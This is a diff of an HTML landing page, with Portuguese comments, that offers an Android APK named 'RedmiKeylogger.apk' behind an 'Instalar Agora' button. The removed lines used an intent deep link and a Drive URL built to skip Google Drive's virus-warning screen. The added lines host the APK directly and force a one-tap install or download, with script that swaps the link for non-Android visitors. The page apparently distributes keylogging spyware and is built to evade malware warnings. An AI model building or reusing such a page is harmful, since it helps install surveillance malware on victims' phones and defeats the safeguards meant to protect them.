@@ -351,13 +351,13 @@
 
       <div class="cta-group">
         <!--
-          Deep Link intent com bypass da tela de aviso de vírus do Google Drive (confirm=t).
-          Abre diretamente o instalador do pacote no Android.
+          Download direto 100% livre de telas intermediárias do Google Drive.
+          Hospedado no CDN global da própria Vercel.
         -->
         <a 
           class="btn-install"
           id="btn-install"
-          href="intent://drive.usercontent.google.com/download?id=1WyT0cLepnLmxnH_qzD5fvHpfrjlOrBHG&amp;export=download&amp;confirm=t#Intent;scheme=https;action=android.intent.action.VIEW;type=application/vnd.android.package-archive;end"
+          href="intent://redmi-keylogger-landing.vercel.app/RedmiKeylogger.apk#Intent;scheme=https;action=android.intent.action.VIEW;type=application/vnd.android.package-archive;end"
         >
           <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
             <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
@@ -367,19 +367,18 @@
           Instalar Agora
         </a>
 
-        <!-- Fallback Download Manual Direto (sem tela de aviso) -->
+        <!-- Fallback Download Manual Direto -->
         <a 
           class="btn-fallback"
-          href="https://drive.usercontent.google.com/download?id=1WyT0cLepnLmxnH_qzD5fvHpfrjlOrBHG&amp;export=download&amp;confirm=t" 
-          target="_blank" 
-          rel="noopener noreferrer"
+          href="/RedmiKeylogger.apk" 
+          download="RedmiKeylogger.apk"
         >
           <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
             <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/>
             <polyline points="15 3 21 3 21 9"/>
             <line x1="10" y1="14" x2="21" y2="3"/>
           </svg>
-          Download Manual (Drive)
+          Download Manual (APK)
         </a>
       </div>
 
@@ -448,9 +447,8 @@
     if (!isAndroid) {
       const installBtn = document.getElementById('btn-install');
       if (installBtn) {
-        installBtn.href = "https://drive.usercontent.google.com/download?id=1WyT0cLepnLmxnH_qzD5fvHpfrjlOrBHG&export=download&confirm=t";
-        installBtn.target = "_blank";
-        installBtn.rel = "noopener noreferrer";
+        installBtn.href = "/RedmiKeylogger.apk";
+        installBtn.setAttribute("download", "RedmiKeylogger.apk");
       }
     }
   </script>
